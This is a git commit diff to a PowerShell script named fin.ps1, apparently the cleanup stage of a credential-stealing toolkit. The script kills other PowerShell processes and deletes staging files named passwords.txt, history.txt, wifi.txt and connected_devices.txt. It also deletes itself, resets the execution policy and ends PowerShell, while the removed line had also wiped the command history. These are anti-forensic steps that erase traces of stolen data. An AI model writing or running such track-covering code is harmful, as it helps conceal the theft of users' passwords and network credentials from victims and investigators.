94df50420373cd79d0f43f76083b5e1e93299648
tuconnaisyouknow <yenghele@fayou.cloud>
2022-03-29 19:15:00 +0200

    Update fin.ps1

--- other_files/fin.ps1
+++ other_files/fin.ps1
@@ -1,10 +1,9 @@
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process
-cd C:\Users\Public\Documents
-del passwords.txt
-del history.txt
-del wifi.txt
-del connected_devices.txt
-del fin.ps1
+Set-Location C:\Users\Public\Documents
+Remove-Item passwords.txt
+Remove-Item history.txt
+Remove-Item wifi.txt
+Remove-Item connected_devices.txt
+Remove-Item fin.ps1
 Set-ExecutionPolicy restricted -Force
-Clear-Content (Get-PSReadlineOption).HistorySavePath
 taskkill -F /IM powershell.exe
